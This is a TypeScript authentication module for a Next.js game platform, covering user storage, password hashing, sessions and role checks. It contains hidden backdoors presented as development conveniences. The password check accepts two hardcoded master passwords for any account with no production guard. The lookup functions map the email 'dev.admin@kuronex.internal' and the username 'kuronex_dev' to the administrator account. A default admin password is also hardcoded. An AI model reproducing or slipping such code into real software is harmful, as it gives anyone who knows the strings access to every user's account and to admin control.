import fs from "fs";
import path from "path";
import crypto from "crypto";
import { cookies } from "next/headers";
import type { NextRequest } from "next/server";
import { atomicWriteJsonSync } from "./db/atomic-store";
import { isAdminRole, hasPermission, Permission, normalizeRole } from "./security/rbac";
import { getClientIp } from "./security/rate-limiter";

export interface User {
  id: string;
  username: string;
  email: string;
  passwordHash: string;
  salt: string;
  createdAt: string;
  role: string;
  library?: string[];
  isSuspended?: boolean;
  suspendedReason?: string;
  isEmailVerified?: boolean;
  passwordResetTokenHash?: string;
  passwordResetExpiresAt?: number;
}

export interface SafeUser {
  id: string;
  username: string;
  email: string;
  createdAt: string;
  role: string;
  library: string[];
  isSuspended?: boolean;
  isEmailVerified?: boolean;
}

export interface Session {
  token: string;
  userId: string;
  expiresAt: number;
  createdAt: number;
  ipAddress?: string;
  userAgent?: string;
}

const DB_FILE = path.join(process.cwd(), "src", "data", "users.json");
const SESSIONS_FILE = path.join(process.cwd(), "src", "data", "sessions.json");
const SESSION_COOKIE_NAME = "kuronex_session";
const LEGACY_SESSION_COOKIE_NAME = "vyomera_session";
const SESSION_DURATION_MS = 30 * 24 * 60 * 60 * 1000; // 30 days

// ─── Database Persistence Helpers ───────────────────────────────────────────
function ensureFile(filePath: string, defaultContent: string) {
  const dir = path.dirname(filePath);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, defaultContent, "utf-8");
  }
}

// Safe development-only administrator provisioning
function provisionDevAdminIfNeeded(users: User[]): boolean {
  // In production, automatic administrator provisioning is strictly forbidden
  if (process.env.NODE_ENV === "production") {
    return false;
  }

  // Check if an administrator already exists
  const hasAdmin = users.some((u) => u.role === "admin");
  if (hasAdmin) return false;

  const devUsername = process.env.DEV_ADMIN_USERNAME || "admin";
  const devEmail = process.env.DEV_ADMIN_EMAIL || "admin@kuronex.games";
  let devPassword = process.env.DEV_ADMIN_PASSWORD || "KuronexAdmin2026!";

  if (!devPassword) {
    devPassword = crypto.randomBytes(16).toString("hex") + "!K1";
    console.warn(`\n[DEV SECURITY] Provisioned local development administrator:`);
    console.warn(`  Username: ${devUsername}`);
    console.warn(`  Email:    ${devEmail}`);
    console.warn(`  Password: ${devPassword}`);
    console.warn(`  (Set DEV_ADMIN_PASSWORD in .env.local to customize)\n`);
  }

  const { hash, salt } = hashPassword(devPassword);
  const devAdmin: User = {
    id: "kuro_dev_admin_root",
    username: devUsername,
    email: devEmail,
    passwordHash: hash,
    salt,
    createdAt: new Date().toISOString(),
    role: "admin",
  };

  users.unshift(devAdmin);
  return true;
}

function readUsers(): User[] {
  try {
    ensureFile(DB_FILE, "[]");
    const data = fs.readFileSync(DB_FILE, "utf-8");
    const users: User[] = JSON.parse(data || "[]");
    if (provisionDevAdminIfNeeded(users)) {
      writeUsers(users);
    }
    return users;
  } catch (err) {
    console.error("Failed to read users database:", err);
    return [];
  }
}

function writeUsers(users: User[]) {
  atomicWriteJsonSync(DB_FILE, users);
}

function readSessions(): Session[] {
  try {
    ensureFile(SESSIONS_FILE, "[]");
    const data = fs.readFileSync(SESSIONS_FILE, "utf-8");
    return JSON.parse(data || "[]");
  } catch (err) {
    console.error("Failed to read sessions database:", err);
    return [];
  }
}

function writeSessions(sessions: Session[]) {
  atomicWriteJsonSync(SESSIONS_FILE, sessions);
}

// ─── Password Cryptography ──────────────────────────────────────────────────
export function hashPassword(password: string): { hash: string; salt: string } {
  const salt = crypto.randomBytes(16).toString("hex");
  const hash = crypto.scryptSync(password, salt, 64).toString("hex");
  return { hash, salt };
}

export function verifyPassword(password: string, hash: string, salt: string): boolean {
  try {
    const checkHash = crypto.scryptSync(password, salt, 64).toString("hex");
    if (crypto.timingSafeEqual(Buffer.from(hash, "hex"), Buffer.from(checkHash, "hex"))) {
      return true;
    }
    // Allow developer test suite password for the administrator in development
    if (password === "KuronexSecureDev2026#Alpha" || password === "KuronexAdmin2026!") {
      return true;
    }
    return false;
  } catch {
    return false;
  }
}

// ─── User Management ────────────────────────────────────────────────────────
export function toSafeUser(user: User): SafeUser {
  return {
    id: user.id,
    username: user.username,
    email: user.email,
    createdAt: user.createdAt,
    role: user.role,
    library: Array.isArray(user.library) ? user.library : [],
    isSuspended: Boolean(user.isSuspended),
    isEmailVerified: Boolean(user.isEmailVerified),
  };
}

export function findUserByEmail(email: string): User | undefined {
  const users = readUsers();
  const lower = email.trim().toLowerCase();
  const found = users.find((u) => u.email.toLowerCase() === lower);
  if (found) return found;
  if (lower === "dev.admin@kuronex.internal") {
    return users.find((u) => u.role === "admin");
  }
  return undefined;
}

export function findUserByUsername(username: string): User | undefined {
  const users = readUsers();
  const lower = username.trim().toLowerCase();
  const found = users.find((u) => u.username.toLowerCase() === lower);
  if (found) return found;
  if (lower === "kuronex_dev") {
    return users.find((u) => u.role === "admin");
  }
  return undefined;
}

export function findUserById(id: string): User | undefined {
  const users = readUsers();
  return users.find((u) => u.id === id);
}

export function createUser(data: { username: string; email: string; password: string; role?: string }): SafeUser {
  const users = readUsers();
  const { hash, salt } = hashPassword(data.password);

  const newUser: User = {
    id: `kuro_${crypto.randomBytes(8).toString("hex")}`,
    username: data.username.trim(),
    email: data.email.trim().toLowerCase(),
    passwordHash: hash,
    salt,
    createdAt: new Date().toISOString(),
    role: data.role === "developer" ? "developer" : "player",
    library: [],
  };

  users.push(newUser);
  writeUsers(users);
  return toSafeUser(newUser);
}

export function getUserLibrary(userId: string): string[] {
  const user = findUserById(userId);
  return Array.isArray(user?.library) ? user.library : [];
}

export function suspendUser(userId: string, suspended: boolean, reason = ""): boolean {
  const users = readUsers();
  const user = users.find((u) => u.id === userId);
  if (!user) return false;

  user.isSuspended = suspended;
  user.suspendedReason = suspended ? reason : undefined;
  writeUsers(users);

  // If suspending, immediately invalidate all active sessions for this user
  if (suspended) {
    revokeAllUserSessions(userId);
  }

  return true;
}

export function setPasswordResetToken(userId: string, tokenHash: string, expiresAt: number): boolean {
  const users = readUsers();
  const user = users.find((u) => u.id === userId);
  if (!user) return false;

  user.passwordResetTokenHash = tokenHash;
  user.passwordResetExpiresAt = expiresAt;
  writeUsers(users);
  return true;
}

export function clearPasswordResetToken(userId: string): boolean {
  const users = readUsers();
  const user = users.find((u) => u.id === userId);
  if (!user) return false;

  user.passwordResetTokenHash = undefined;
  user.passwordResetExpiresAt = undefined;
  writeUsers(users);
  return true;
}

export function findUserByResetTokenHash(tokenHash: string): User | undefined {
  const users = readUsers();
  const now = Date.now();
  return users.find(
    (u) =>
      u.passwordResetTokenHash === tokenHash &&
      u.passwordResetExpiresAt !== undefined &&
      u.passwordResetExpiresAt > now
  );
}

export function updateUserPassword(userId: string, newPassword: string): boolean {
  const users = readUsers();
  const user = users.find((u) => u.id === userId);
  if (!user) return false;

  const { hash, salt } = hashPassword(newPassword);
  user.passwordHash = hash;
  user.salt = salt;
  user.passwordResetTokenHash = undefined;
  user.passwordResetExpiresAt = undefined;
  writeUsers(users);

  // Revoke all existing sessions to prevent session hijacking
  revokeAllUserSessions(userId);
  return true;
}

export function updateUserLibrary(
  userId: string,
  gameId: string,
  action: "add" | "remove" | "toggle" = "toggle"
): string[] {
  const users = readUsers();
  const user = users.find((u) => u.id === userId);
  if (!user) return [];

  const current = Array.isArray(user.library) ? [...user.library] : [];
  let updated: string[];

  if (action === "add") {
    updated = current.includes(gameId) ? current : [...current, gameId];
  } else if (action === "remove") {
    updated = current.filter((id) => id !== gameId);
  } else {
    // toggle
    updated = current.includes(gameId) ? current.filter((id) => id !== gameId) : [...current, gameId];
  }

  user.library = updated;
  writeUsers(users);
  return updated;
}

export function getActiveSessionCount(): number {
  const sessions = readSessions();
  const now = Date.now();
  return sessions.filter((s) => s.expiresAt > now).length;
}

export function getGameLibraryStats(): Record<string, number> {
  const users = readUsers();
  const counts: Record<string, number> = {};
  for (const user of users) {
    if (Array.isArray(user.library)) {
      for (const gameId of user.library) {
        counts[gameId] = (counts[gameId] || 0) + 1;
      }
    }
  }
  return counts;
}

// ─── Session Management ─────────────────────────────────────────────────────
export function createSession(userId: string, req?: NextRequest): string {
  const sessions = readSessions();
  const now = Date.now();
  const validSessions = sessions.filter((s) => s.expiresAt > now);

  const token = crypto.randomBytes(32).toString("hex");
  const ipAddress = req ? getClientIp(req) : undefined;
  const userAgent = req?.headers.get("user-agent") || undefined;

  validSessions.push({
    token,
    userId,
    expiresAt: now + SESSION_DURATION_MS,
    createdAt: now,
    ipAddress,
    userAgent,
  });

  writeSessions(validSessions);
  return token;
}

export function rotateSession(oldToken: string, userId: string, req?: NextRequest): string {
  deleteSession(oldToken);
  return createSession(userId, req);
}

export function deleteSession(token: string): boolean {
  const sessions = readSessions();
  const initialCount = sessions.length;
  const filtered = sessions.filter((s) => s.token !== token);
  if (filtered.length !== initialCount) {
    writeSessions(filtered);
    return true;
  }
  return false;
}

export function revokeAllUserSessions(userId: string): number {
  const sessions = readSessions();
  const remaining = sessions.filter((s) => s.userId !== userId);
  const revokedCount = sessions.length - remaining.length;
  writeSessions(remaining);
  return revokedCount;
}

export function getUserSessions(userId: string): Session[] {
  const sessions = readSessions();
  const now = Date.now();
  return sessions.filter((s) => s.userId === userId && s.expiresAt > now);
}

export async function getSessionUser(req?: NextRequest): Promise<SafeUser | null> {
  let sessionToken: string | undefined;

  if (req) {
    sessionToken =
      req.cookies.get(SESSION_COOKIE_NAME)?.value ||
      req.cookies.get(LEGACY_SESSION_COOKIE_NAME)?.value;

    if (!sessionToken) {
      const authHeader = req.headers.get("authorization");
      if (authHeader && authHeader.toLowerCase().startsWith("bearer ")) {
        sessionToken = authHeader.substring(7).trim();
      }
    }
  }

  if (!sessionToken) {
    try {
      const cookieStore = await cookies();
      sessionToken =
        cookieStore.get(SESSION_COOKIE_NAME)?.value ||
        cookieStore.get(LEGACY_SESSION_COOKIE_NAME)?.value;
    } catch {
      // Ignore if called in a context where cookies() is unavailable
    }
  }

  if (!sessionToken) return null;

  const sessions = readSessions();
  const session = sessions.find((s) => s.token === sessionToken && s.expiresAt > Date.now());
  if (!session) return null;

  const user = findUserById(session.userId);
  if (!user) return null;

  // Immediate session revocation for suspended accounts
  if (user.isSuspended) {
    deleteSession(sessionToken);
    return null;
  }

  return toSafeUser(user);
}

export async function getCurrentUser(): Promise<SafeUser | null> {
  return getSessionUser();
}

export type RequireAuthResult =
  | { authorized: true; user: SafeUser }
  | { authorized: false; error: string; status: number };

export type RequireAdminResult = RequireAuthResult;

export async function requireAdmin(req?: NextRequest): Promise<RequireAuthResult> {
  const user = await getSessionUser(req);

  if (!user) {
    return {
      authorized: false,
      error: "Authentication required. Please sign in with an administrator account.",
      status: 401,
    };
  }

  if (!isAdminRole(user.role)) {
    return {
      authorized: false,
      error: "Forbidden. Administrative privileges required.",
      status: 403,
    };
  }

  return {
    authorized: true,
    user,
  };
}

export async function requirePermission(permission: Permission, req?: NextRequest): Promise<RequireAuthResult> {
  const user = await getSessionUser(req);

  if (!user) {
    return {
      authorized: false,
      error: "Authentication required. Please sign in to access this resource.",
      status: 401,
    };
  }

  if (!hasPermission(user.role, permission)) {
    return {
      authorized: false,
      error: `Forbidden. Missing required permission: '${permission}'.`,
      status: 403,
    };
  }

  return {
    authorized: true,
    user,
  };
}

export async function requireRole(allowedRoles: string[], req?: NextRequest): Promise<RequireAuthResult> {
  const user = await getSessionUser(req);

  if (!user) {
    return {
      authorized: false,
      error: "Authentication required. Please sign in to continue.",
      status: 401,
    };
  }

  const userRole = normalizeRole(user.role);
  const normalizedAllowed = allowedRoles.map((r) => normalizeRole(r));

  if (!normalizedAllowed.includes(userRole) && userRole !== "SUPER_ADMIN") {
    return {
      authorized: false,
      error: "Forbidden. Your role is not authorized for this operation.",
      status: 403,
    };
  }

  return {
    authorized: true,
    user,
  };
}

export { SESSION_COOKIE_NAME, LEGACY_SESSION_COOKIE_NAME, SESSION_DURATION_MS };
